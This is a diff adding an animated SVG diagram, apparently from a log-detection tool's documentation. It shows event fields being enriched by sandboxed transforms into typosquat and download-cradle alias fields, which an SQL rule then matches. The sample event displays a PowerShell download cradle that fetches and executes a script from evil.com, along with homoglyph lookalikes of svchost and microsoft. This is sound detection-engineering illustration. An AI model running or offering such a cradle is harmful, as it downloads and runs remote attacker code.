@@ -1,0 +1,187 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 422" width="960" height="422" role="img" aria-labelledby="t d">
+  <title id="t">What field transforms do</title>
+  <desc id="d">An event's CommandLine, Image and QueryName pass through sandboxed catalogue transforms from the commandline, process and network categories. They add CommandLine_DownloadCradle (DOWNLOADSTRING|WEBCLIENT), CommandLine_URLs (http://evil.com/mal.ps1), Image_TyposquatDetect (TYPOSQUAT:svchost(HOMOGLYPH)) and QueryName_TyposquatDetect beside the unchanged originals, and an SQL condition on Image_TyposquatDetect matches the event.</desc>
+  <style>
+    :root {
+      --paper: #eef1ef;
+      --panel: #f8faf8;
+      --ink: #16211e;
+      --ink-2: #4a5955;
+      --rule: #cfd8d4;
+      --signal: #00697a;
+      --strip: #7c8b87;
+      --danger: #a3134e;
+      --danger-tint: rgb(163 19 78 / 0.12);
+    }
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --paper: #0e191c;
+        --panel: #13232a;
+        --ink: #e2ebe8;
+        --ink-2: #9daea9;
+        --rule: #26393f;
+        --signal: #53c2cf;
+        --strip: #5f7570;
+        --danger: #f2568e;
+        --danger-tint: rgb(242 86 142 / 0.18);
+      }
+    }
+    text { fill: var(--ink); font: 13px ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
+    .mono, .mono text { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+    .card { fill: var(--paper); stroke: var(--rule); }
+    .panel { fill: var(--panel); stroke: var(--rule); }
+    .ink2 { fill: var(--ink-2); }
+    .step { font-weight: 600; }
+    .step .ink2 { font-weight: 400; }
+    .arrow { fill: none; stroke: var(--strip); stroke-width: 1.5; }
+    .head { fill: var(--strip); }
+    .field { fill: var(--signal); font-weight: 600; }
+    .sandbox { fill: var(--panel); stroke: var(--strip); stroke-dasharray: 5 4; }
+    .kw { fill: var(--signal); font-weight: 600; }
+    .hit-bg { fill: var(--danger-tint); }
+    .hit-strip { fill: var(--danger); }
+    .hit-text { fill: var(--danger); font-weight: 600; }
+
+    .scene, .an { animation: 11s ease-in-out infinite; }
+    .scene { animation-name: scene; }
+    .f1 { animation-name: f1; }
+    .f2 { animation-name: f2; }
+    .f3 { animation-name: f3; }
+    .c1 { animation-name: c1; }
+    .o1 { animation-name: o1; }
+    .o2 { animation-name: o2; }
+    .c2 { animation-name: c2; }
+    .o3 { animation-name: o3; }
+    .c3 { animation-name: c3; }
+    .o4 { animation-name: o4; }
+    .sql { animation-name: sql; }
+    .hit { animation-name: hit; }
+
+    @keyframes f1 { 0%, 2.73% { opacity: 0; transform: translateX(-10px); } 6.82%, 100% { opacity: 1; transform: none; } }
+    @keyframes f2 { 0%, 4.55% { opacity: 0; transform: translateX(-10px); } 8.64%, 100% { opacity: 1; transform: none; } }
+    @keyframes f3 { 0%, 6.36% { opacity: 0; transform: translateX(-10px); } 10.45%, 100% { opacity: 1; transform: none; } }
+    @keyframes c1 { 0%, 13.64% { opacity: 0; transform: translateX(-8px); } 17.73%, 100% { opacity: 1; transform: none; } }
+    @keyframes o1 { 0%, 20% { opacity: 0; transform: translateX(-10px); } 24.09%, 100% { opacity: 1; transform: none; } }
+    @keyframes o2 { 0%, 23.64% { opacity: 0; transform: translateX(-10px); } 27.73%, 100% { opacity: 1; transform: none; } }
+    @keyframes c2 { 0%, 30% { opacity: 0; transform: translateX(-8px); } 34.09%, 100% { opacity: 1; transform: none; } }
+    @keyframes o3 { 0%, 35.45% { opacity: 0; transform: translateX(-10px); } 39.55%, 100% { opacity: 1; transform: none; } }
+    @keyframes c3 { 0%, 41.82% { opacity: 0; transform: translateX(-8px); } 45.91%, 100% { opacity: 1; transform: none; } }
+    @keyframes o4 { 0%, 47.27% { opacity: 0; transform: translateX(-10px); } 51.36%, 100% { opacity: 1; transform: none; } }
+    @keyframes sql { 0%, 56.36% { opacity: 0; transform: translateY(6px); } 60.91%, 100% { opacity: 1; transform: none; } }
+    @keyframes hit { 0%, 63.64% { opacity: 0; } 69.09%, 100% { opacity: 1; } }
+    @keyframes scene { 0%, 96.36% { opacity: 1; } 100% { opacity: 0; } }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after { animation: none !important; }
+    }
+  </style>
+
+  <rect class="card" x="0.5" y="0.5" width="959" height="421" rx="14"/>
+
+  <text class="step" x="24" y="30">Event fields</text>
+  <text class="ink2" x="24" y="48">left unchanged</text>
+  <text class="step" x="360" y="30">Catalogue transforms</text>
+  <text class="ink2" x="360" y="48">sandboxed, by category</text>
+  <text class="step" x="552" y="30">New alias fields</text>
+  <text class="ink2" x="552" y="48">added beside the originals</text>
+
+  <!-- everything below the column headings sits 18px lower -->
+  <g class="scene" transform="translate(0 18)">
+    <!-- the raw fields -->
+    <g class="an f1">
+      <rect class="panel" x="24.5" y="48.5" width="312" height="102" rx="6"/>
+      <g class="mono">
+        <text class="field" x="38" y="70">CommandLine</text>
+        <text x="38" y="94">powershell -c "IEX(New-Object</text>
+        <text x="38" y="113">Net.WebClient).DownloadString(</text>
+        <text x="38" y="132">'http://evil.com/mal.ps1')"</text>
+      </g>
+    </g>
+    <g class="an f2">
+      <rect class="panel" x="24.5" y="166.5" width="312" height="48" rx="6"/>
+      <g class="mono">
+        <text class="field" x="38" y="186">Image</text>
+        <text x="38" y="205">C:\Users\Public\svch0st.exe</text>
+      </g>
+    </g>
+    <g class="an f3">
+      <rect class="panel" x="24.5" y="230.5" width="312" height="66" rx="6"/>
+      <g class="mono">
+        <text class="field" x="38" y="250">QueryName</text>
+        <text x="38" y="270">micros0ft.xyz</text>
+      </g>
+    </g>
+
+    <!-- one sandboxed chip per transform, labelled with its category -->
+    <g class="an c1">
+      <path class="arrow" d="M337 99h9M346 72v54M346 72h8M346 126h8"/>
+      <path class="head" d="M360 72l-6-4v8zM360 126l-6-4v8z"/>
+      <rect class="sandbox" x="360.5" y="57.5" width="168" height="30" rx="15"/>
+      <text class="mono" x="444.5" y="77" text-anchor="middle">commandline</text>
+      <rect class="sandbox" x="360.5" y="111.5" width="168" height="30" rx="15"/>
+      <text class="mono" x="444.5" y="131" text-anchor="middle">commandline</text>
+    </g>
+    <g class="an c2">
+      <path class="arrow" d="M337 190.5h17"/>
+      <path class="head" d="M360 190.5l-6-4v8z"/>
+      <rect class="sandbox" x="360.5" y="175.5" width="168" height="30" rx="15"/>
+      <text class="mono" x="444.5" y="195" text-anchor="middle">process</text>
+    </g>
+    <g class="an c3">
+      <path class="arrow" d="M337 263.5h17"/>
+      <path class="head" d="M360 263.5l-6-4v8z"/>
+      <rect class="sandbox" x="360.5" y="248.5" width="168" height="30" rx="15"/>
+      <text class="mono" x="444.5" y="268" text-anchor="middle">network</text>
+    </g>
+
+    <!-- the alias fields the transforms add -->
+    <g class="an o1">
+      <path class="arrow" d="M529 72.5h17"/><path class="head" d="M552 72.5l-6-4v8z"/>
+      <rect class="panel" x="552.5" y="48.5" width="384" height="48" rx="6"/>
+      <g class="mono">
+        <text class="field" x="566" y="68">CommandLine_DownloadCradle</text>
+        <text x="566" y="87">DOWNLOADSTRING|WEBCLIENT</text>
+      </g>
+    </g>
+    <g class="an o2">
+      <path class="arrow" d="M529 126.5h17"/><path class="head" d="M552 126.5l-6-4v8z"/>
+      <rect class="panel" x="552.5" y="102.5" width="384" height="48" rx="6"/>
+      <g class="mono">
+        <text class="field" x="566" y="122">CommandLine_URLs</text>
+        <text x="566" y="141">http://evil.com/mal.ps1</text>
+      </g>
+    </g>
+    <g class="an o3">
+      <path class="arrow" d="M529 190.5h17"/><path class="head" d="M552 190.5l-6-4v8z"/>
+      <rect class="panel" x="552.5" y="166.5" width="384" height="48" rx="6"/>
+      <rect class="hit-bg an hit" x="553" y="167" width="383" height="47" rx="5.5"/>
+      <rect class="hit-strip an hit" x="553" y="167" width="3" height="47"/>
+      <g class="mono">
+        <text class="field" x="566" y="186">Image_TyposquatDetect</text>
+        <text x="566" y="205">TYPOSQUAT:svchost(HOMOGLYPH)</text>
+      </g>
+    </g>
+    <g class="an o4">
+      <path class="arrow" d="M529 263.5h17"/><path class="head" d="M552 263.5l-6-4v8z"/>
+      <rect class="panel" x="552.5" y="230.5" width="384" height="66" rx="6"/>
+      <g class="mono">
+        <text class="field" x="566" y="250">QueryName_TyposquatDetect</text>
+        <text x="566" y="270">TYPOSQUAT_TECH:microsoft(HOMOGLYPH,CHAR_SWAP)</text>
+        <text x="566" y="288">|SUSPICIOUS_TLD:xyz</text>
+      </g>
+    </g>
+
+    <!-- a rule reads the new field like any other column -->
+    <g class="an sql">
+      <rect class="panel" x="24.5" y="318.5" width="912" height="42" rx="6"/>
+      <text class="mono" x="40" y="344"><tspan class="kw">SELECT</tspan> * <tspan class="kw">FROM</tspan> logs <tspan class="kw">WHERE</tspan> Image_TyposquatDetect != ''</text>
+    </g>
+    <g class="an hit">
+      <path class="hit-strip" d="M738 339.5h12"/>
+      <path class="hit-strip" d="M756 339.5l-6-4v8z"/>
+      <text class="hit-text" x="764" y="344">this event matches</text>
+    </g>
+  </g>
+
+  <text class="ink2" x="480" y="406" text-anchor="middle">Rules match the new fields like any other column; the originals are still there to match too.</text>
+</svg>
